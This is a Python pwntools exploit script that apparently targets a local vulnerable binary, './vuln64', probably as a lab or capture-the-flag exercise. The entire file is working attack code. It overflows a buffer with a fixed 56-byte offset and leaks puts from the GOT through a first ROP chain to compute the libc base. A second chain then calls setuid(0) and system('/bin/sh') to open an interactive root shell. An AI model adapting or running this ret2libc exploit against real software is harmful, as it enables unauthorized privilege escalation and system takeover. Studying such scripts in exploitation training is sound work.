#!/usr/bin/env python
from pwn import *
from pprint import pprint



context.arch = 'amd64' #this is a must!!!

offset = 56	#use dmesg

elf = ELF("./vuln64")
p = elf.process(['./vuln64', 'h'])

#pprint(elf.symbols)


############Create rop chain with memory leaks using puts function (displays on screen)
rop = ROP(elf)	#return orientated programming - automated feature
rop.call(elf.symbols["puts"], [elf.got["puts"]]) #enhanced rop chain feature. Loads puts from got table
rop.call(elf.symbols["helpCommand"])	# call back to original vuln function (back to the start full circle)




payload = [

	b"A"*offset,
	rop.chain()
]

payload = b"".join(payload)		
p.sendline(payload)		# send payload round 1
p.recvline()
######################################################################

puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))	#take leaked input from rop chain and store

#puts = p.recvuntil("\n")
#print(puts)
log.info(f"puts found: {hex(puts)}" )



libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")	#load libc lib with symbols
libc.address = puts - libc.symbols["puts"]		#offset libc base address with puts
log.info(f"libc base address: {hex(libc.address)}" )	#log output

#########################################ROP chain round 2...remember, we are back at start vuln func
rop = ROP(libc)
rop.call(libc.sym.setuid, [0])
rop.call("puts", [ next(libc.search(b"/bin/sh\x00"))])
rop.call("system", [ next(libc.search(b"/bin/sh\x00"))])
rop.call("exit")

payload = [

	b"A"*offset,
	rop.chain()
]

payload = b"".join(payload)

p.sendline(payload)

p.interactive()

